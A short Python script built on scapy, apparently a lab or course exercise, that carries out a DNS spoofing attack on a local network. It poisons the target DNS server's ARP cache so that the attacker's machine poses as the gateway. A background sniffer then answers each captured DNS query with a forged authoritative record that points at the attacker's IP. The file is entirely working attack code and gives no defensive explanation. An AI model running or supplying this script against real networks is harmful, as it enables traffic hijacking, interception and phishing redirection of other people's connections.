# Maor Frost and Asaf Yahav
from scapy.all import *
from scapy.layers import *
from scapy.layers.inet import UDP, IP

MY_IP = "192.168.68.102" # The IP address we are promoting
TARGET_DNS_SERVER = "192.168.68.106" # The DNS we are attacking


def is_DNS_request(pkt): # Check if we sniffed a DNS request
    return pkt.haslayer(DNS) and pkt.getlayer(DNS).qr == 0

def DNS_response_maker(DNS_request): # Build a spoofed DNS response
    print("DNS request received!")
    ip = IP(
        dst=DNS_request[IP].src, # Return to sender
        src=DNS_request[IP].dst # Pretend we were the destination
        )
    udp = UDP(
        dport=DNS_request[UDP].sport, # Return to sender
        sport=DNS_request[UDP].dport # Pretend we were the destination
    )
    dns = DNS(
        id=DNS_request[DNS].id, # Copy the id
        qr=1, # DNS response
        aa=1, # Authorotatvie answer
        qd=DNS_request[DNS].qd, # Copy the original question
        an=DNSRR(
            rrname=DNS_request[DNSQR].qname, # The requested domain name
            type="A",
            ttl=60,
            rdata=MY_IP # Our spoofed answer
        )
    )

    pkt = ip / udp / dns
    send(pkt)



arp_reply = ARP(
    op=2, # 2 = is-at (ARP reply)
    psrc= conf.route.route("0.0.0.0")[2], # Gateway's IP
    pdst= TARGET_DNS_SERVER, # the target DNS's IP
    hwsrc= get_if_hwaddr(conf.route.route("0.0.0.0")[0]), # the MAC we want to advertise
)

# Start the background sniffer
sniffer = AsyncSniffer(filter="udp port 53", lfilter=is_DNS_request, prn=DNS_response_maker)
sniffer.start()
print("Sniffer started in background...")

# Bonus: ARP spoofing for being the gateway
while True:
    try:
        # While the sniffer is running, send ARP packets in the main loop
        while sniffer.running:
            print("ARP spoofing...")
            send(arp_reply)
            time.sleep(1)

    except KeyboardInterrupt:
        sniffer.stop()
        exit(0)